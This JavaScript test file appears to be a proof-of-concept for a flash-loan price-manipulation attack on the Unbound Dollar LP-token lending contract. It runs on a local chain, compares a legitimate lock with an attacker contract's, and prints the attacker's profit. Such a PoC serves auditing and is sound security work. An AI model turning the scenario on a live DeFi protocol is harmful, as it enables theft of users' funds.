const { expect } = require("chai");

describe("Scenario", function() {

  const CHAIN_ID = "5777";
  const loanRate = 500000;
  const feeRate = 5000;
  const rateBalance = 10 ** 6;

  let deployer;
  let safu;
  let devFund;
  let owner;
  let attacker;

  let testEth;
  let testDai;
  let uniswapV2Factory;
  let wETH;
  let uniswapV2Router;
  let unboundDollar;

  let LPTAddress;
  let LPTContract;
  let pairLockContract;
  let pairDaiUNDStakingContract;
  
  //RealValues
  const _66kkValue = ethers.utils.parseEther('66000000');
  const _108kValue = ethers.utils.parseEther('108000');
  
  const _38kkValue = ethers.utils.parseEther('38000000');
  const _63kValue = ethers.utils.parseEther('63000');
  
  // Scenario values
  const daiAmount = _66kkValue;
  const etherAmount = _108kValue;
  const loanAmountDAI = _38kkValue;
  
  const attackerLiquidityDAI = ethers.utils.parseEther('700000');
  const attackerLiquidityETH = ethers.utils.parseEther('1000');
  
  let attackerLPTsAmount;
  
  before(async () => {
    const accounts = await ethers.getSigners();

    deployer = accounts[0];
    safu = accounts[1];
    devFund = accounts[2];
    owner = accounts[3];
    attacker = accounts[4];
    
    // TestEth
    const TestEth = await ethers.getContractFactory("TestEth");
    testEth = await TestEth.deploy(deployer.address);
    await testEth.deployed();
    console.log("Deployed TestEth");

    // TestDai
    const TestDai = await ethers.getContractFactory("TestDai");
    testDai = await TestDai.deploy(deployer.address, CHAIN_ID);
    await testDai.deployed();
    console.log("Deployed TestDai");

    // UniswapV2Factory
    const UniswapV2Factory = await ethers.getContractFactory("UniswapV2Factory");
    uniswapV2Factory = await UniswapV2Factory.deploy(deployer.address);
    await uniswapV2Factory.deployed();
    console.log("Deployed UniswapV2Factory");

    // WETH
    const WETH = await ethers.getContractFactory("WETH9");
    wETH = await WETH.deploy();
    await wETH.deployed();
    console.log("Deployed WETH");

    // UniswapV2Router
    const UniswapV2Router = await ethers.getContractFactory("UniswapV2Router02");
    uniswapV2Router = await UniswapV2Router.deploy(uniswapV2Factory.address, wETH.address);
    await uniswapV2Router.deployed();
    console.log("Deployed UniswapV2Router");

    // UnboundDollar
    const UnboundDollar = await ethers.getContractFactory("UnboundDollar");
    unboundDollar = await UnboundDollar.deploy("Unbound Dollar", "UND", safu.address, devFund.address);
    await unboundDollar.deployed();
    console.log("Deployed UnboundDollar");

    // Valuing
    const Valuing = await ethers.getContractFactory("Valuing_01");
    valuing = await Valuing.deploy(unboundDollar.address);
    await valuing.deployed();
    console.log("Deployed Valuing");

    // LLC
    const txCreateDaiEthPair = await uniswapV2Factory.createPair(testDai.address, testEth.address);
    const pairDaiEth = await txCreateDaiEthPair.wait();
    LPTAddress = pairDaiEth.events[0].args.pair;

    const UniswapV2Pair = await ethers.getContractFactory("UniswapV2Pair");
    LPTContract = UniswapV2Pair.attach(LPTAddress);
   
    const LLC_EthDai = await ethers.getContractFactory("LLC_EthDai");
    lLC_EthDai = await LLC_EthDai.deploy(valuing.address, LPTAddress, testDai.address, unboundDollar.address);
    await lLC_EthDai.deployed();
    console.log("Deployed LLC_EthDai");

    pairLockContract = await UniswapV2Pair.attach(await lLC_EthDai.pair());

    await valuing.addLLC(lLC_EthDai.address, loanRate, feeRate);
    await valuing.allowToken(unboundDollar.address);
    await unboundDollar.changeValuator(valuing.address);
    console.log("Configured LLC");

    // Approve
    await testDai.approve(uniswapV2Router.address, daiAmount);
    await testEth.approve(uniswapV2Router.address, etherAmount);
    console.log("Approved Router");

    // Liquidity
    let time = (new Date()).getTime();
    await uniswapV2Router.addLiquidity(
      testDai.address,
      testEth.address,
      daiAmount, // DAI -- 66kk -- 38m to be borrowed
      etherAmount, // ETH -- 108k
      daiAmount, // minDai
      etherAmount, // minEth
      owner.address,
      parseInt(time / 1000 + 100)
    );
    console.log("Added liquidity and minted LT to owner address:", owner.address);

    // UND Stake pool
    const txCreateDaiUNDPair = await uniswapV2Factory.createPair(testDai.address, unboundDollar.address);
    const pairDaiUND = await txCreateDaiUNDPair.wait();

    pairDaiUNDStakingContract = UniswapV2Pair.attach(pairDaiUND.events[0].args.pair);
    await unboundDollar.changeStaking(pairDaiUNDStakingContract.address);
    console.log("Configured staking for UND");

  });

  it('Attackers adds liquidity to Eth_Dai to get some LPT - legitimate', async () => {
    
    console.log('');
    console.log('Attackers adds liquidity to Eth_Dai to get some LPT - legitimate');

    // Approve
    await testDai.approve(uniswapV2Router.address, attackerLiquidityDAI);
    await testEth.approve(uniswapV2Router.address, attackerLiquidityETH);
    console.log("Approved Router");

    // Liquidity
    let time = (new Date()).getTime();
    
    await uniswapV2Router.addLiquidity(
      testDai.address,
      testEth.address,
      attackerLiquidityDAI, // DAI
      attackerLiquidityETH, // ETH
      1, // minDai
      1, // minEth
      attacker.address,
      Math.round(time / 1000 + 100)
    );

    console.log("Added liquidity and minted LT to attacker address:", attacker.address);
    
    attackerLPTsAmount = parseInt(await pairLockContract.balanceOf(attacker.address));
    expect(attackerLPTsAmount, 'attacker\'s LPT balance incorrect').to.greaterThan(10 * 10**18);

    console.log('attacker\'s LPT balance:', attackerLPTsAmount);
  });

  it('Lock as much LPTs by owner as attacker has (for comparison) - legitimate', async () => {
    
    console.log('');
    console.log('Lock as much LPTs by owner as attacker has (for comparison)');

    const LPTbal = parseInt(await pairLockContract.balanceOf(owner.address));
    console.log('Owner\'s LTP balance: ', LPTbal);
    const LPtokensInt = Math.floor(attackerLPTsAmount/10**18)*10**18;
    const LPtokens = ethers.utils.parseEther(Math.floor(LPtokensInt/10**18).toString()); // Amount of token to be locked
    console.log('Owner\'s tokens to lock: ', LPtokens);

    let daiLiquidity = parseInt(await testDai.balanceOf(LPTAddress));

    const totalUSD = daiLiquidity * 2; // Total value in Liquidity pool
    console.log('Total USD value:', totalUSD);
    const totalLPTokens = parseInt(await pairLockContract.totalSupply()); // Total token amount of Liq pool
    console.log('Total amount of tokens in LP:', totalLPTokens);
    const LPTValueInDai = Math.round((totalUSD * LPtokensInt) / totalLPTokens); //% value of Liq pool in Dai
    console.log('% value of locked value over all tokens in LP:', LPTValueInDai);
    let loanAmount = Math.round((LPTValueInDai * loanRate) / rateBalance); // Loan amount that user can get
    console.log('Loan amount owner can get:', loanAmount / 10**18);
    const feeAmount = Math.floor((loanAmount * feeRate) / rateBalance) + 10**18; // Amount of fee
    console.log('Fee:', feeAmount / 10**18);
    const stakingAmount = 0;
    
    loanAmount -=  10**18;
    
    await pairLockContract.connect(owner).approve(lLC_EthDai.address, LPtokens);

    const minLoanAmountCallValue = ethers.utils.parseEther(((loanAmount - feeAmount)/10**18).toString()); // Loan amount that user calls (ready to be passed to smart contract)

    console.log(loanAmount/10**18);
    console.log((loanAmount - feeAmount)/10**18);

    lLC_EthDai.connect(owner).lockLPT(LPtokens, minLoanAmountCallValue);
    // await expect(lLC_EthDai.connect(owner).lockLPT(LPtokens, minLoanAmountCallValue)).to.emit(lLC_EthDai, 'LockLPT').withArgs(
    //   LPtokens.toString(),
    //   owner.address,
    //   unboundDollar.address
    // ).to.emit(unboundDollar, 'Mint').withArgs(
    //   owner.address,
    //   ethers.utils.parseEther((loanAmount/10**18).toString())
    // );

    const ownerBal = parseInt(await unboundDollar.balanceOf(owner.address));
    const stakingBal = parseInt(await unboundDollar.balanceOf(pairDaiUNDStakingContract.address));
    const loanedAmount = parseInt(await unboundDollar.checkLoan(owner.address, lLC_EthDai.address));

    console.log('owner\'s UND balance:', ownerBal);

    expect(ownerBal, 'owner balance incorrect').to.be.at.least(loanAmount - feeAmount);
    expect(stakingBal, 'staking balance incorrect').to.be.at.least(stakingAmount);
    expect(loanedAmount, 'loaned amount incorrect').to.be.at.least(loanAmount);
  });


  it('Lock LPTs by attacker - malicious - get a lot more UND', async () => {
    
    console.log('');
    console.log('Lock LPTs by  - attacker - malicious - get a lot more UND');

    const SimpleFlashLoan = await ethers.getContractFactory("SimpleFlashLoan");
    simpleFlashLoan = await SimpleFlashLoan.deploy(testDai.address);
    await simpleFlashLoan.deployed();
    console.log("Deployed SimpleFlashLoan");

    const FlashLoanAttacker = await ethers.getContractFactory("FlashLoanAttacker");
    flashLoanAttacker = await FlashLoanAttacker.connect(attacker)
      .deploy(simpleFlashLoan.address, testDai.address, testEth.address, loanAmountDAI, 
                ethers.utils.parseEther(Math.floor(attackerLPTsAmount/10**18).toString()),
                uniswapV2Router.address, pairLockContract.address, lLC_EthDai.address);
    await flashLoanAttacker.deployed();
    console.log("Deployed FlashLoanAttacker");

    const flashLoanAttackerUNDBal_before = parseInt(await unboundDollar.balanceOf(flashLoanAttacker.address));

    const _250kInt = 250000;
    const _250kValue = ethers.utils.parseEther(_250kInt.toString());
    
    // Give 1kk DAI to attacker contract (thats what he looses)
    await testDai.transfer(flashLoanAttacker.address, _250kValue);

    // Give 10 LPT to attacker contract
    await pairLockContract.connect(attacker).transfer(flashLoanAttacker.address, 
        ethers.utils.parseEther(Math.floor(attackerLPTsAmount/10**18).toString())
      );

    // Transfer Dai to lending pool
    await testDai.transfer(simpleFlashLoan.address, _38kkValue);

    // Start the attack
    await flashLoanAttacker.connect(attacker).attack();

    const flashLoanAttackerUNDBal_after = parseInt(await unboundDollar.balanceOf(flashLoanAttacker.address));
    console.log('Flash loan attacker contract\'s UND balance:', flashLoanAttackerUNDBal_after);
    const flashLoanAttackerDAIBal = parseInt(await testDai.balanceOf(flashLoanAttacker.address));
    console.log('Flash loan attacker contract\'s DAI balance:', flashLoanAttackerDAIBal / 10**18);

    console.log('-----');
    const gotUND = flashLoanAttackerUNDBal_after - flashLoanAttackerUNDBal_before;
    console.log('Got UND:', gotUND / 10**18);
    const shouldGet = parseInt(await unboundDollar.balanceOf(owner.address));
    console.log('Should get UND:', shouldGet / 10**18);
    const cost = _250kInt - flashLoanAttackerDAIBal / 10**18;
    console.log('Dai cost:', cost);
    console.log('PROFIT:', (gotUND - shouldGet) / 10**18 - cost - 38000000*0.003);

    // expect(ownerBal, 'owner balance incorrect').to.greaterThan(loanAmount - feeAmount);
    
  });

});
